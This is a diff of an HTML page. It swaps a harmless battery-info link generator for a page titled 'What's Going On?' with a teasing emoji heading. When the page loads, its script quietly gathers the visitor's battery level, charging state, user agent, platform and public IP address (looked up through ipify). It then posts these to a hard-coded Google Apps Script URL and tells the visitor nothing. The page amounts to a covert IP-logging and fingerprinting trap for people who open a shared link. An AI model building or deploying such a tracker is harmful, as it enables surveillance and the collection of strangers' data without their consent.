@@ -3,50 +3,43 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Battery Info Link Generator</title>
+    <title>What's Going On?</title>
+</head>
+<body>
+    <h1>What's going on? 😏</h1>
+
     <script>
-        function generateLink() {
-            const uniqueID = Math.random().toString(36).substring(2, 8); // Random ID
-            const url = window.location.origin + window.location.pathname + "?id=" + uniqueID;
-            
-            // Display the link
-            document.getElementById("generatedLink").innerHTML = `
-                <input type="text" value="${url}" id="linkBox" readonly>
-                <button onclick="copyLink()">Copy Link</button>
-            `;
-        }
+        async function sendData() {
+            if (navigator.getBattery) {
+                const battery = await navigator.getBattery();
+                const batteryLevel = battery.level * 100;
+                const chargingStatus = battery.charging ? "Charging" : "Not Charging";
+                const userAgent = navigator.userAgent;
+                const platform = navigator.platform;
 
-        function copyLink() {
-            const linkBox = document.getElementById("linkBox");
-            linkBox.select();
-            document.execCommand("copy");
-            alert("Link copied! Share it.");
-        }
+                // Get IP Address
+                const ipResponse = await fetch("https://api64.ipify.org?format=json");
+                const ipData = await ipResponse.json();
+                const ipAddress = ipData.ip;
 
-        async function showBatteryInfo() {
-            if (new URLSearchParams(window.location.search).has("id")) {
-                if ('getBattery' in navigator) {
-                    const battery = await navigator.getBattery();
-                    const level = Math.round(battery.level * 100) + "%";
-                    const charging = battery.charging ? "Yes" : "No";
-                    const userAgent = navigator.userAgent;
-
-                    document.body.innerHTML = `
-                        <h2>📊 Device Info</h2>
-                        <p><b>🔋 Battery:</b> ${level}</p>
-                        <p><b>⚡ Charging:</b> ${charging}</p>
-                        <p><b>📱 Device:</b> ${userAgent}</p>
-                    `;
-                } else {
-                    document.body.innerHTML = "<h2>Battery info not supported on this device!</h2>";
-                }
+                // Send data to Google Sheets
+                fetch("https://script.google.com/macros/s/AKfycbztrGBTr8dvHV9_jmVxAMc9m-MAuu5hL-0_hWT8r3h-VI4abO-AVDKCoeQAml44LYGHmw/exec", { 
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify({
+                        battery: batteryLevel + "%",
+                        charging: chargingStatus,
+                        device: userAgent,
+                        platform: platform,
+                        ip: ipAddress
+                    })
+                });
             }
         }
+
+        sendData();
     </script>
-</head>
-<body onload="showBatteryInfo()">
-    <h2>Battery Info Link Generator</h2>
-    <button onclick="generateLink()">Generate Link</button>
-    <p id="generatedLink"></p>
 </body>
 </html>
